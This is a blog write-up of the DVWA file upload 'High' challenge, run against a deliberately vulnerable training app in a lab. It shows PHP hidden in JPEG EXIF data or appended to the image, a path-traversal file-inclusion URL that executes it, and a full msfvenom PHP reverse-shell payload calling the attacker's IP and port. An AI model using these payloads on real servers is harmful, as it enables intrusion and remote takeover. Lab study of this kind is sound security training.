---
layout: post
title:  "DVWA File Upload"
subtitle: "Damn Vulnerable Web Application"
date:   2017-03-05 13:00:00 -0500
author: "coastal"
header-img: "images/site-resources/dvwa-header.jpg"
---
I haven't been able to make much progress with these as I have been traveling for the past week. However I found a little time to finish the File Upload Vulnerability challenge. The "Low" challenge simply allowed us to upload our webshell and the "Medium" made us change the mime-type to "image/jpeg" in the ```POST``` request to the server with our webshell php file unobfuscated as the upload. Let's dive into the "High" challenge, was it was a little more involved and a lot more interesting.

# Security: High
First, let's take a look at the challenge source to see what changes have been made vs the earlier challenges:

```
// Where are we going to be writing to?
$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

// File information
$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

// Is it an image?
if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
    ( $uploaded_size < 100000 ) &&
    getimagesize( $uploaded_tmp ) ) { 
```

Aha, so we have some server-side checking to ensure that the uploaded file is indeed an image. This time it is more involved that just checking the file-extension, and the php function ```getimagesize``` is invoked. Looking up the function, it doesn't seem like there are any exploits to pass non-image files through it (barring a 0-day which I most certainly don't have).

However, while researching bypass techniques I discovered a technique to hide php code in the EXIF data of the image file. When the image is loaded by the page, the php tags located in the headers are interpreted as php code and run by the server. So by crafting a script, we can test our RCE by implanting it in a document with random data to emulate headers from a JPEG file.

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/php-include-jpeg-php.jpg">

Here we insert the ```phpinfo();``` pop into the random data and upload it to the server. Then when we test accession  the file (interpreting it as php):

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/php-include-phpinfo-pop.jpg">

We see that the php code is parsed from the random data and executed by the interpreter. Now let's try to run the exploit remotely on the webserver by embedding the ```phpinfo();``` pop into the ```DocumentName``` header of a random JPEG image.

```
exiftool -DocumentName="<?php phpinfo(); die(); ?>" sea.jpeg
```

```exiftool``` is a great command-line tool for editing the EXIF tag metadata for image files. We have modified the ```DocumentName``` header value to hold our script. Let's run it locally from the terminal to make sure that it runs:

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/exif-implant.jpg">

Ah, unfortunately for us, it looks like a parsing error has arisen far into the JPEG's byte-data. It looks like the ```die();``` call didn't actually stop the interpreter from searching through the rest of the file for php code. Looking a little further into this, there appears to be a function made mainly for debugging called ```__halt_compiler();```. This method supposedly stops the interpreter from compiling any of the code following the method call. Let's see if that can remedy our parsing issue.

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/halt-compiler-vs-die.jpg">

Alright it looks like that did indeed fix the issue. Next we upload the file to the server. As the image is valid and can pass through ```getimagesize()``` without issue, our script is now sitting on the server waiting to be executed. Next, we set the security level back to low and execute our Local File Inclusion vulnerability at ```192.168.56.101/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/sea-exif.jpeg```.

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/exif-phpinfo-pop.jpg">

Wicked, we've got remote code execution on the server! Now let's try to throw a shell into the EXIF header and fully own the system.

```
exiftools -DocumentName='/*<?php /**/ error_reporting(0); $ip = "192.168.56.102"; $port = 4444; if (($f = "stream_socket_client") && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = "stream"; } elseif (($f = "fsockopen") && is_callable($f)) { $s = $f($ip, $port); $s_type = "stream"; } elseif (($f = "socket_create") && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = "socket"; } else { die("no socket funcs"); } if (!$s) { die("no socket"); } switch ($s_type) { case "stream": $len = fread($s, 4); break; case "socket": $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a["len"]; $b = ""; while (strlen($b) < $len) { switch ($s_type) { case "stream": $b .= fread($s, $len-strlen($b)); break; case "socket": $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS["msgsock"] = $s; $GLOBALS["msgsock_type"] = $s_type; eval($b); die(); __halt_compiler();'
```

I grabbed this payload from the ```msfvenom``` reverse_tcp payload (modifying the ip and port values to match my attacking box). Here we manually throw it in the EXIF data and upload the backdoored image to the webserver. When we access it with the LFI vulnerability:

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/exif-reverse-shell-success.jpg">

Boom, we have a meterpreter shell!

## Alternate Approach: Shell Append

Apparently, while not in use here, there are some upload sanitation techniques that include scanning the EXIF headers for php shells. Maybe we can use another technique that could potentially bypass this sanitation approach as well:

```
echo "<?php phpinfo(); ?>" >> sea.jpeg
```

This concatenation to the end of the image file is actually the standard way that ```msfvenom``` packages tcp reverse shells with image files.

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/phpinfo-append.jpg">

When we upload our modified jpeg and access it with our LFI vulnerability:

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/phpinfo-pop.jpg">

Awesome! We are able to get the phpinfo to pop. Looks like we have RCE! Now let's leverage this to get a remote shell on the webserver. Metasploit makes the packaging a breeze, but we could also just use our ```cat``` call technique to throw our old payload onto the end of the image. If we were to do that we could also get rid of the ```__halt_compiler();``` call as we will be at the end of the file and don't need to worry about php parsing errors with the remaining bytes in the image file. 

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/msfvenom-jpg-reverse-tcp.jpg">

Next let's set up the handler to catch the reverse shell from the webserver

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/reverse-shell-handler.jpg">

And finally, let's use the file-inclusion vulnerability on the "Low" security setting to make sure that our file is passed to ```include()``` and our webshell is fired off by heading to 

```
http://192.168.56.101/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/sea-exif.jpeg
```

<img src="{{ site.baseurl }}/images/dvwa/03_file_upload/reverse-shell-catch.jpg">

And we got it! For the next steps, we could try to use privilege escalation to get root, but for now this works as a PoC. I know I'm not too familiar with the meterpreter shell commands...that is something I will be working on in the near future. 
